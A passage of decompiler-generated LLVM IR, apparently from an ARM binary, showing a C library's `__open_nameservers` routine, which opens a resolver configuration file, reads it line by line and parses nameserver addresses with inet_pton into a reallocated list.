  %v1_1dc8c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1dc80, label %dec_label_pc_1dc88, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1dc80 = add i32 %v1_1dc8c.pre, 1
  store i32 %v2_1dc80, i32* %r0.global-to-local, align 4
  %v1_1dc54 = inttoptr i32 %v2_1dc80 to i8*
  %v2_1dc54 = load i8, i8* %v1_1dc54, align 1
  %v2_1dc58 = icmp eq i8 %v2_1dc54, 0
  store i1 %v2_1dc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc58, label %dec_label_pc_1dc88, label %bb8.dec_label_pc_1dc64_crit_edge

bb8.dec_label_pc_1dc64_crit_edge:                 ; preds = %bb8
  %v0_1dc64.pre = load i32, i32* @ip, align 4
  %v1_1dc64.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1dc64

dec_label_pc_1dc88:                               ; preds = %bb8, %dec_label_pc_1dc64, %bb7, %entry
  %v1_1dc8c = phi i32 [ %v0_1dc54.pre, %entry ], [ %v1_1dc8c.pre, %bb7 ], [ %v2_1dc7c14, %dec_label_pc_1dc64 ], [ %v2_1dc80, %bb8 ]
  %v2_1dc88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1dc88, i32* @r4, align 4
  ret i32 %v1_1dc8c

; uselistorder directives
  uselistorder i8 %v2_1dc54, { 2, 1, 0 }
  uselistorder i8* %v1_1dc54, { 1, 0 }
  uselistorder i32 %v2_1dc80, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1dc6c, { 1, 0 }
  uselistorder i8 %v2_1dc5416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i32 532, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_1dc88, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1dc64, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1dc98 = load i32, i32* @r4, align 4
  store i32 %v3_1dc98, i32* %stack_var_-36, align 4
  %v15_1dc98 = load i32, i32* @r8, align 4
  %v18_1dc98 = load i32, i32* @sb, align 4
  %v21_1dc98 = load i32, i32* @sl, align 4
  %v24_1dc98 = load i32, i32* @fp, align 4
  %v27_1dc98 = load i32, i32* @lr, align 4
  store i32 27348, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  %v4_1dca8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 27348) to i32*), align 4
  store i32 %v4_1dca8, i32* @r4, align 4
  %v2_1dcac = icmp eq i32 %v4_1dca8, 0
  br i1 %v2_1dcac, label %dec_label_pc_1dcb8, label %dec_label_pc_1dce8

dec_label_pc_1dcb8:                               ; preds = %entry
  %v2_1dcbc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1dcbc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32952), i32* %r0.global-to-local, align 4
  %v2_1dcc4 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32952), i32 %v2_1dcbc)
  store i32 %v2_1dcc4, i32* %r0.global-to-local, align 4
  %v2_1dcc8 = icmp eq i32 %v2_1dcc4, 0
  %v1_1dccc = load i32, i32* @r4, align 4
  %.v1_1dccc = select i1 %v2_1dcc8, i32 %tmp38, i32 %v1_1dccc
  store i32 26344, i32* %r1.global-to-local, align 4
  store i32 %.v1_1dccc, i32* %r2.global-to-local, align 4
  %v0_1dcd8 = load i32, i32* @r5, align 4
  %v2_1dcd8 = add i32 %v0_1dcd8, 26344
  %v3_1dcd8 = inttoptr i32 %v2_1dcd8 to i32*
  %v4_1dcd8 = load i32, i32* %v3_1dcd8, align 4
  store i32 %v4_1dcd8, i32* %r3.global-to-local, align 4
  %v9_1dcdc = icmp eq i32 %v4_1dcd8, %.v1_1dccc
  br i1 %v9_1dcdc, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_1dcb8
  store i32 %.v1_1dccc, i32* %v3_1dcd8, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1dcb8, %bb
  store i32 122088, i32* @lr, align 4
  %v1_1dce4 = xor i1 %v9_1dcdc, true
  call void @__pseudo_cond_branch(i1 %v1_1dce4, i32 ptrtoint (i32* @global_var_1e0f4.1251 to i32))
  %v0_1dcec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1dce8

dec_label_pc_1dce8:                               ; preds = %entry, %bb58
  %v2_1dd00 = phi i32 [ ptrtoint (i16* @global_var_2c158.876 to i32), %entry ], [ %v0_1dcec.pre, %bb58 ]
  store i32 27360, i32* %r3.global-to-local, align 4
  %v2_1dcec = add i32 %v2_1dd00, 27360
  %v3_1dcec = inttoptr i32 %v2_1dcec to i32*
  %v4_1dcec = load i32, i32* %v3_1dcec, align 4
  store i32 %v4_1dcec, i32* %r3.global-to-local, align 4
  %v2_1dcf0 = icmp eq i32 %v4_1dcec, 0
  br i1 %v2_1dcf0, label %dec_label_pc_1dcf8, label %dec_label_pc_1e08c

dec_label_pc_1dcf8:                               ; preds = %dec_label_pc_1dce8
  %v4_1dd00 = add i32 %v2_1dd00, 1130
  %v5_1dd00 = inttoptr i32 %v4_1dd00 to i8*
  store i8 5, i8* %v5_1dd00, align 1
  store i32 -32952, i32* %r0.global-to-local, align 4
  store i32 1131, i32* %r3.global-to-local, align 4
  store i32 -33924, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_1dd14 = load i32, i32* @r5, align 4
  %v5_1dd14 = add i32 %v3_1dd14, 1131
  %v6_1dd14 = inttoptr i32 %v5_1dd14 to i8*
  store i8 3, i8* %v6_1dd14, align 1
  %v0_1dd18 = load i32, i32* @r5, align 4
  %v1_1dd18 = load i32, i32* %r0.global-to-local, align 4
  %v2_1dd18 = add i32 %v1_1dd18, %v0_1dd18
  store i32 %v2_1dd18, i32* @r0, align 4
  %v1_1dd1c = load i32, i32* %r1.global-to-local, align 4
  %v2_1dd1c = add i32 %v1_1dd1c, %v0_1dd18
  store i32 %v2_1dd1c, i32* @r1, align 4
  %v5_1dd20 = call i32 @__GI_fopen(i32 %v2_1dd18, i32 %v2_1dd1c, i32 3, i32 1131)
  store i32 %v5_1dd20, i32* %r0.global-to-local, align 4
  store i32 %v5_1dd20, i32* @fp, align 4
  %v2_1dd24 = icmp eq i32 %v5_1dd20, 0
  br i1 %v2_1dd24, label %dec_label_pc_1dfb0, label %dec_label_pc_1df58

dec_label_pc_1dd30:                               ; preds = %dec_label_pc_1df58, %dec_label_pc_1df8c.backedge
  store i32 %v2_1df8c, i32* %r0.global-to-local, align 4
  %v2_1dd34 = call i32 @skip_and_NUL_space(i8* %v1_1dd34)
  store i32 %v2_1dd34, i32* %r0.global-to-local, align 4
  store i32 %v2_1dd34, i32* @r4, align 4
  %v0_1dd3c = call i32 @skip_nospace()
  store i32 %v0_1dd3c, i32* %r0.global-to-local, align 4
  %v1_1dd40 = inttoptr i32 %v0_1dd3c to i8*
  %v2_1dd40 = call i32 @skip_and_NUL_space(i8* %v1_1dd40)
  store i32 %v2_1df5c, i32* @r1, align 4
  store i32 %v2_1dd40, i32* @r7, align 4
  %v0_1dd4c = load i32, i32* @r4, align 4
  store i32 %v0_1dd4c, i32* %r0.global-to-local, align 4
  %v2_1dd50 = inttoptr i32 %v0_1dd4c to i8*
  %v3_1dd50 = call i32 @__GI_strcoll(i8* %v2_1dd50, i32 %v2_1df5c)
  store i32 %v3_1dd50, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1dd50, 16777216
  %v1_1dd54 = sdiv i32 %sext, 16777216
  store i32 %v1_1dd54, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1dd5c, label %dec_label_pc_1de18

dec_label_pc_1dd5c:                               ; preds = %dec_label_pc_1dd30
  %v0_1dd5c = load i32, i32* @r7, align 4
  store i32 %v0_1dd5c, i32* %r0.global-to-local, align 4
  %v0_1dd60 = call i32 @skip_nospace()
  %v1_1dd60 = inttoptr i32 %v0_1dd60 to i8*
  store i32 %v2_1dd64, i32* @r4, align 4
  %v0_1dd68 = load i32, i32* @r6, align 4
  %v1_1dd68 = trunc i32 %v0_1dd68 to i8
  store i8 %v1_1dd68, i8* %v1_1dd60, align 1
  %v0_1dd6c = load i32, i32* @r6, align 4
  store i32 %v0_1dd6c, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_1dd64, i32* %r0.global-to-local, align 4
  %v3_1dd78 = call i32 @__GI_memset(i8* %v2_1dd78, i32 %v0_1dd6c)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1dd80 = load i32, i32* @r7, align 4
  store i32 %v0_1dd80, i32* %r1.global-to-local, align 4
  store i32 %v2_1dd84, i32* %r2.global-to-local, align 4
  %v3_1dd88 = inttoptr i32 %v0_1dd80 to i8*
  %v4_1dd88 = call i32 @inet_pton(i32 10, i8* %v3_1dd88, i32 %v2_1dd84)
  store i32 %v4_1dd88, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_1dd88, 1
  br i1 %tmp59, label %dec_label_pc_1dd98, label %dec_label_pc_1ddb4

dec_label_pc_1dd98:                               ; preds = %dec_label_pc_1dd5c
  %v0_1dd98 = load i32, i32* @r7, align 4
  store i32 %v0_1dd98, i32* %r1.global-to-local, align 4
  store i32 %v2_1dd9c, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_1dda4 = inttoptr i32 %v0_1dd98 to i8*
  %v4_1dda4 = call i32 @inet_pton(i32 2, i8* %v3_1dda4, i32 %v2_1dd9c)
  store i32 %v4_1dda4, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_1dda4, 1
  br i1 %tmp60, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1ddb4

dec_label_pc_1ddb4:                               ; preds = %dec_label_pc_1dd98, %dec_label_pc_1dd5c
  %v0_1ddb8.off0 = phi i16 [ 10, %dec_label_pc_1dd5c ], [ 2, %dec_label_pc_1dd98 ]
  store i32 %v2_1ddb4, i32* %r2.global-to-local, align 4
  store i16 %v0_1ddb8.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 27360, i32* @r7, align 4
  %v0_1ddc8 = load i32, i32* @r5, align 4
  %v2_1ddc8 = add i32 %v0_1ddc8, 27360
  %v3_1ddc8 = inttoptr i32 %v2_1ddc8 to i32*
  %v4_1ddc8 = load i32, i32* %v3_1ddc8, align 4
  store i32 27356, i32* @sl, align 4
  %v1_1ddd0 = add i32 %v4_1ddc8, 1
  store i32 %v1_1ddd0, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1ddd8 = mul i32 %v1_1ddd0, 28
  store i32 %v2_1ddd8, i32* %r1.global-to-local, align 4
  %v2_1dddc = add i32 %v0_1ddc8, 27356
  %v3_1dddc = inttoptr i32 %v2_1dddc to i32*
  %v4_1dddc = load i32, i32* %v3_1dddc, align 4
  store i32 %v4_1dddc, i32* %r0.global-to-local, align 4
  %v2_1dde0 = inttoptr i32 %v4_1dddc to i32*
  %v3_1dde0 = call i32 @realloc(i32* %v2_1dde0, i32 %v2_1ddd8)
  store i32 %v3_1dde0, i32* %r0.global-to-local, align 4
  store i32 %v3_1dde0, i32* @r6, align 4
  %v2_1dde4 = icmp eq i32 %v3_1dde0, 0
  br i1 %v2_1dde4, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1ddec

dec_label_pc_1ddec:                               ; preds = %dec_label_pc_1ddb4
  %v0_1ddec = load i32, i32* @r5, align 4
  %v1_1ddec = load i32, i32* @r7, align 4
  %v2_1ddec = add i32 %v1_1ddec, %v0_1ddec
  %v3_1ddec = inttoptr i32 %v2_1ddec to i32*
  %v4_1ddec = load i32, i32* %v3_1ddec, align 4
  store i32 %v4_1ddec, i32* %r4.global-to-local, align 4
  %v1_1ddf0 = load i32, i32* @r8, align 4
  %v3_1ddf0 = mul i32 %v1_1ddf0, %v4_1ddec
  %v4_1ddf0 = add i32 %v3_1ddf0, %v3_1dde0
  store i32 %v4_1ddf0, i32* %lr.global-to-local, align 4
  %v2_1ddf8 = load i16, i16* %stack_var_-68, align 2
  %v3_1ddf8 = sext i16 %v2_1ddf8 to i32
  store i32 %v3_1ddf8, i32* %r0.global-to-local, align 4
  %v6_1ddf8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1ddf8, i32* %r1.global-to-local, align 4
  %v9_1ddf8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1ddf8, i32* %r2.global-to-local, align 4
  store i32 %v14_1ddf8, i32* @ip, align 4
  %v2_1ddfc = load i32, i32* @sl, align 4
  %v3_1ddfc = add i32 %v2_1ddfc, %v0_1ddec
  %v4_1ddfc = inttoptr i32 %v3_1ddfc to i32*
  store i32 %v3_1dde0, i32* %v4_1ddfc, align 4
  %v0_1de00 = load i32, i32* %lr.global-to-local, align 4
  %v1_1de00 = inttoptr i32 %v0_1de00 to i32*
  %v2_1de00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1de00, i32* %v1_1de00, align 4
  %v3_1de00 = add i32 %v0_1de00, 4
  %v4_1de00 = inttoptr i32 %v3_1de00 to i32*
  %v5_1de00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1de00, i32* %v4_1de00, align 4
  %v6_1de00 = add i32 %v0_1de00, 8
  %v7_1de00 = inttoptr i32 %v6_1de00 to i32*
  %v8_1de00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1de00, i32* %v7_1de00, align 4
  %v9_1de00 = add i32 %v0_1de00, 12
  %v10_1de00 = inttoptr i32 %v9_1de00 to i32*
  %v11_1de00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1de00, i32* %v10_1de00, align 4
  %v12_1de00 = add i32 %v0_1de00, 16
  store i32 %v12_1de00, i32* @lr, align 4
  %v2_1de04 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_1de04, i32* %r0.global-to-local, align 4
  %v0_1de08 = load i32, i32* %r4.global-to-local, align 4
  %v1_1de08 = add i32 %v0_1de08, 1
  store i32 %v1_1de08, i32* %r4.global-to-local, align 4
  %v1_1de0c = inttoptr i32 %v12_1de00 to i32*
  store i32 %v2_1de04, i32* %v1_1de0c, align 4
  %v3_1de0c = add i32 %v0_1de00, 20
  %v4_1de0c = inttoptr i32 %v3_1de0c to i32*
  %v5_1de0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1de0c, i32* %v4_1de0c, align 4
  %v6_1de0c = add i32 %v0_1de00, 24
  %v7_1de0c = inttoptr i32 %v6_1de0c to i32*
  %v8_1de0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1de0c, i32* %v7_1de0c, align 4
  %v0_1de10 = load i32, i32* %r4.global-to-local, align 4
  %v1_1de10 = load i32, i32* @r5, align 4
  %v2_1de10 = load i32, i32* @r7, align 4
  %v3_1de10 = add i32 %v2_1de10, %v1_1de10
  %v4_1de10 = inttoptr i32 %v3_1de10 to i32*
  store i32 %v0_1de10, i32* %v4_1de10, align 4
  br label %dec_label_pc_1df8c.backedge

dec_label_pc_1df8c.backedge:                      ; preds = %dec_label_pc_1deb4, %dec_label_pc_1dea4, %dec_label_pc_1de70, %dec_label_pc_1ddec, %dec_label_pc_1df44, %dec_label_pc_1dd98, %dec_label_pc_1ddb4, %dec_label_pc_1deec, %dec_label_pc_1def4, %dec_label_pc_1ded8, %dec_label_pc_1df28
  %v0_1df98.pre = load i32, i32* @fp, align 4
  store i32 %v2_1df8c, i32* @r4, align 4
  store i32 %v2_1df8c, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1df98.pre, i32* %r2.global-to-local, align 4
  %v3_1df9c = call i32 @fgets(i32 %v2_1df8c, i32 128, i32 %v0_1df98.pre)
  store i32 %v3_1df9c, i32* %r0.global-to-local, align 4
  %v2_1dfa0 = icmp eq i32 %v3_1df9c, 0
  br i1 %v2_1dfa0, label %dec_label_pc_1dfa8, label %dec_label_pc_1dd30

dec_label_pc_1de18:                               ; preds = %dec_label_pc_1dd30
  %v0_1de18 = load i32, i32* @r4, align 4
  store i32 %v0_1de18, i32* %r0.global-to-local, align 4
  store i32 %v2_1df68, i32* @r1, align 4
  %v2_1de20 = inttoptr i32 %v0_1de18 to i8*
  %v3_1de20 = call i32 @__GI_strcoll(i8* %v2_1de20, i32 %v2_1df68)
  store i32 %v3_1de20, i32* %r0.global-to-local, align 4
  %v2_1de24 = icmp eq i32 %v3_1de20, 0
  br i1 %v2_1de24, label %dec_label_pc_1de58, label %dec_label_pc_1de2c

dec_label_pc_1de2c:                               ; preds = %dec_label_pc_1de18
  %v0_1de2c = load i32, i32* @r4, align 4
  store i32 %v0_1de2c, i32* %r0.global-to-local, align 4
  store i32 %v2_1df74, i32* @r1, align 4
  %v2_1de34 = inttoptr i32 %v0_1de2c to i8*
  %v3_1de34 = call i32 @__GI_strcoll(i8* %v2_1de34, i32 %v2_1df74)
  store i32 %v3_1de34, i32* %r0.global-to-local, align 4
  %v2_1de38 = icmp eq i32 %v3_1de34, 0
  br i1 %v2_1de38, label %dec_label_pc_1de58, label %dec_label_pc_1ded8

dec_label_pc_1de44:                               ; preds = %dec_label_pc_1de58, %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge
  %v2_1de48 = phi i32 [ %v1_1de5c, %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge ], [ %v1_1de5c10, %dec_label_pc_1de58 ]
  %v0_1de48 = phi i32 [ %v1_1de64, %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge ], [ %v1_1de6417, %dec_label_pc_1de58 ]
  %v1_1de44 = phi i32 [ %v1_1de44.pre, %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge ], [ 27352, %dec_label_pc_1de58 ]
  %v1_1de48 = phi i32 [ %v0_1de5c, %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge ], [ %v0_1de5c9, %dec_label_pc_1de58 ]
  %v2_1de44 = add i32 %v1_1de48, %v1_1de44
  %v3_1de44 = inttoptr i32 %v2_1de44 to i32*
  %v4_1de44 = load i32, i32* %v3_1de44, align 4
  store i32 %v4_1de44, i32* %r3.global-to-local, align 4
  %v3_1de48 = add i32 %v1_1de48, %v2_1de48
  %v4_1de48 = inttoptr i32 %v3_1de48 to i32*
  store i32 %v0_1de48, i32* %v4_1de48, align 4
  %v0_1de4c = load i32, i32* %r3.global-to-local, align 4
  %v1_1de4c = load i32, i32* %r2.global-to-local, align 4
  %v4_1de4c = mul i32 %v1_1de4c, 4
  %v5_1de4c = add i32 %v4_1de4c, %v0_1de4c
  %v6_1de4c = inttoptr i32 %v5_1de4c to i32*
  %v7_1de4c = load i32, i32* %v6_1de4c, align 4
  store i32 %v7_1de4c, i32* @r0, align 4
  %v0_1de50 = call i32 @free()
  store i32 %v0_1de50, i32* %r0.global-to-local, align 4
  %v0_1de5c = load i32, i32* @r5, align 4
  %v1_1de5c = load i32, i32* @sb, align 4
  %v2_1de5c = add i32 %v1_1de5c, %v0_1de5c
  %v3_1de5c = inttoptr i32 %v2_1de5c to i32*
  %v4_1de5c = load i32, i32* %v3_1de5c, align 4
  store i32 %v4_1de5c, i32* %r3.global-to-local, align 4
  %v2_1de60 = icmp eq i32 %v4_1de5c, 0
  %v1_1de64 = add i32 %v4_1de5c, -1
  store i32 %v1_1de64, i32* %r2.global-to-local, align 4
  br i1 %v2_1de60, label %dec_label_pc_1de6c, label %dec_label_pc_1de44.dec_label_pc_1de44_crit_edge

dec_label_pc_1de44.dec_label_pc_1de44_crit_edge:  ; preds = %dec_label_pc_1de44
  %v1_1de44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1de44

dec_label_pc_1de58:                               ; preds = %dec_label_pc_1de2c, %dec_label_pc_1de18
  store i32 27352, i32* @r4, align 4
  %v0_1de5c9 = load i32, i32* @r5, align 4
  %v1_1de5c10 = load i32, i32* @sb, align 4
  %v2_1de5c11 = add i32 %v1_1de5c10, %v0_1de5c9
  %v3_1de5c12 = inttoptr i32 %v2_1de5c11 to i32*
  %v4_1de5c13 = load i32, i32* %v3_1de5c12, align 4
  store i32 %v4_1de5c13, i32* %r3.global-to-local, align 4
  %v2_1de6015 = icmp eq i32 %v4_1de5c13, 0
  %v1_1de6417 = add i32 %v4_1de5c13, -1
  store i32 %v1_1de6417, i32* %r2.global-to-local, align 4
  br i1 %v2_1de6015, label %dec_label_pc_1de6c, label %dec_label_pc_1de44

dec_label_pc_1de6c:                               ; preds = %dec_label_pc_1de44, %dec_label_pc_1de58
  store i32 27352, i32* @r6, align 4
  br label %dec_label_pc_1de70

dec_label_pc_1de70:                               ; preds = %dec_label_pc_1deb4, %dec_label_pc_1de6c
  %v0_1de70 = load i32, i32* @r7, align 4
  store i32 %v0_1de70, i32* %r0.global-to-local, align 4
  %v0_1de74 = call i32 @skip_nospace()
  store i32 %v0_1de74, i32* %r0.global-to-local, align 4
  %v1_1de78 = inttoptr i32 %v0_1de74 to i8*
  %v2_1de78 = call i32 @skip_and_NUL_space(i8* %v1_1de78)
  store i32 %v2_1de78, i32* %r0.global-to-local, align 4
  %v0_1de7c = load i32, i32* @r5, align 4
  %v1_1de7c = load i32, i32* @sb, align 4
  %v2_1de7c = add i32 %v1_1de7c, %v0_1de7c
  %v3_1de7c = inttoptr i32 %v2_1de7c to i32*
  %v4_1de7c = load i32, i32* %v3_1de7c, align 4
  store i32 %v2_1de78, i32* @r4, align 4
  %tmp69 = mul i32 %v4_1de7c, 4
  %v3_1de88 = add i32 %tmp69, 4
  store i32 %v3_1de88, i32* %r1.global-to-local, align 4
  %v1_1de8c = load i32, i32* @r6, align 4
  %v2_1de8c = add i32 %v1_1de8c, %v0_1de7c
  %v3_1de8c = inttoptr i32 %v2_1de8c to i32*
  %v4_1de8c = load i32, i32* %v3_1de8c, align 4
  store i32 %v4_1de8c, i32* %r0.global-to-local, align 4
  %v2_1de90 = inttoptr i32 %v4_1de8c to i32*
  %v3_1de90 = call i32 @realloc(i32* %v2_1de90, i32 %v3_1de88)
  store i32 %v3_1de90, i32* %r3.global-to-local, align 4
  %v2_1de94 = icmp eq i32 %v3_1de90, 0
  %v0_1de98 = load i32, i32* @r7, align 4
  store i32 %v0_1de98, i32* %r0.global-to-local, align 4
  %v0_1de9c = load i32, i32* @r4, align 4
  store i32 %v0_1de9c, i32* @r7, align 4
  br i1 %v2_1de94, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1dea4

dec_label_pc_1dea4:                               ; preds = %dec_label_pc_1de70
  %v1_1dea4 = load i32, i32* @r5, align 4
  %v2_1dea4 = load i32, i32* @r6, align 4
  %v3_1dea4 = add i32 %v2_1dea4, %v1_1dea4
  %v4_1dea4 = inttoptr i32 %v3_1dea4 to i32*
  store i32 %v3_1de90, i32* %v4_1dea4, align 4
  %v1_1dea8 = inttoptr i32 %v0_1de98 to i8*
  %v2_1dea8 = call i32 @__GI_strdup(i8* %v1_1dea8)
  store i32 %v2_1dea8, i32* %r0.global-to-local, align 4
  %v2_1deac = icmp eq i32 %v2_1dea8, 0
  br i1 %v2_1deac, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1deb4

dec_label_pc_1deb4:                               ; preds = %dec_label_pc_1dea4
  %v0_1deb4 = load i32, i32* @r5, align 4
  %v1_1deb4 = load i32, i32* @sb, align 4
  %v2_1deb4 = add i32 %v1_1deb4, %v0_1deb4
  %v3_1deb4 = inttoptr i32 %v2_1deb4 to i32*
  %v4_1deb4 = load i32, i32* %v3_1deb4, align 4
  store i32 %v4_1deb4, i32* %r3.global-to-local, align 4
  %v1_1deb8 = load i32, i32* @r6, align 4
  %v2_1deb8 = add i32 %v1_1deb8, %v0_1deb4
  %v3_1deb8 = inttoptr i32 %v2_1deb8 to i32*
  %v4_1deb8 = load i32, i32* %v3_1deb8, align 4
  store i32 %v4_1deb8, i32* %r2.global-to-local, align 4
  %v1_1debc = add i32 %v4_1deb4, 1
  store i32 %v1_1debc, i32* %r1.global-to-local, align 4
  %v5_1dec0 = mul i32 %v4_1deb4, 4
  %v6_1dec0 = add i32 %v4_1deb8, %v5_1dec0
  %v7_1dec0 = inttoptr i32 %v6_1dec0 to i32*
  store i32 %v2_1dea8, i32* %v7_1dec0, align 4
  %v0_1dec4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dec4 = load i32, i32* @r5, align 4
  %v2_1dec4 = load i32, i32* @sb, align 4
  %v3_1dec4 = add i32 %v2_1dec4, %v1_1dec4
  %v4_1dec4 = inttoptr i32 %v3_1dec4 to i32*
  store i32 %v0_1dec4, i32* %v4_1dec4, align 4
  %v0_1dec8 = load i32, i32* @r4, align 4
  %v1_1dec8 = inttoptr i32 %v0_1dec8 to i8*
  %v2_1dec8 = load i8, i8* %v1_1dec8, align 1
  %v3_1dec8 = zext i8 %v2_1dec8 to i32
  store i32 %v3_1dec8, i32* %r3.global-to-local, align 4
  %v2_1decc = icmp eq i8 %v2_1dec8, 0
  br i1 %v2_1decc, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1de70

dec_label_pc_1ded8:                               ; preds = %dec_label_pc_1de2c
  %v0_1ded8 = load i32, i32* @r4, align 4
  store i32 %v0_1ded8, i32* %r0.global-to-local, align 4
  %v2_1dedc = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1dedc, i32* @r1, align 4
  %v2_1dee0 = inttoptr i32 %v0_1ded8 to i8*
  %v3_1dee0 = call i32 @__GI_strcoll(i8* %v2_1dee0, i32 %v2_1dedc)
  store i32 %v3_1dee0, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1dee0, 16777216
  %v1_1dee4 = sdiv i32 %sext2, 16777216
  store i32 %v1_1dee4, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1deec, label %dec_label_pc_1df8c.backedge

dec_label_pc_1deec:                               ; preds = %dec_label_pc_1ded8
  %v0_1deec = load i32, i32* @r7, align 4
  %v2_1deec = icmp eq i32 %v0_1deec, 0
  br i1 %v2_1deec, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1def4

dec_label_pc_1def4:                               ; preds = %dec_label_pc_1deec
  store i32 %v0_1deec, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1defc = call i32 @__GI_strchr(i32 %v0_1deec, i32 58)
  store i32 %v2_1defc, i32* %r0.global-to-local, align 4
  store i32 %v2_1defc, i32* @r6, align 4
  %v3_1df00 = icmp eq i32 %v2_1defc, 0
  br i1 %v3_1df00, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1df08

dec_label_pc_1df08:                               ; preds = %dec_label_pc_1def4
  store i32 -32896, i32* %r1.global-to-local, align 4
  %v0_1df0c = load i32, i32* @r4, align 4
  %v1_1df0c = trunc i32 %v0_1df0c to i8
  %v3_1df0c = inttoptr i32 %v2_1defc to i8*
  store i8 %v1_1df0c, i8* %v3_1df0c, align 1
  %v0_1df10 = load i32, i32* @r5, align 4
  %v1_1df10 = load i32, i32* %r1.global-to-local, align 4
  %v2_1df10 = add i32 %v1_1df10, %v0_1df10
  store i32 %v2_1df10, i32* @r1, align 4
  %v0_1df14 = load i32, i32* @r7, align 4
  store i32 %v0_1df14, i32* %r0.global-to-local, align 4
  %v2_1df18 = inttoptr i32 %v0_1df14 to i8*
  %v3_1df18 = call i32 @__GI_strcoll(i8* %v2_1df18, i32 %v2_1df10)
  store i32 %v3_1df18, i32* %r0.global-to-local, align 4
  %v2_1df1c = icmp eq i32 %v3_1df18, 0
  br i1 %v2_1df1c, label %dec_label_pc_1df44, label %dec_label_pc_1df28

dec_label_pc_1df28:                               ; preds = %dec_label_pc_1df08
  %v0_1df2c = load i32, i32* @r7, align 4
  store i32 %v0_1df2c, i32* %r0.global-to-local, align 4
  %v0_1df30 = load i32, i32* @r5, align 4
  %v2_1df30 = add i32 %v0_1df30, -32888
  store i32 %v2_1df30, i32* @r1, align 4
  %v2_1df34 = inttoptr i32 %v0_1df2c to i8*
  %v3_1df34 = call i32 @__GI_strcoll(i8* %v2_1df34, i32 %v2_1df30)
  store i32 %v3_1df34, i32* %r0.global-to-local, align 4
  %v2_1df38 = icmp eq i32 %v3_1df34, 0
  br i1 %v2_1df38, label %dec_label_pc_1df44, label %dec_label_pc_1df8c.backedge

dec_label_pc_1df44:                               ; preds = %dec_label_pc_1df28, %dec_label_pc_1df08
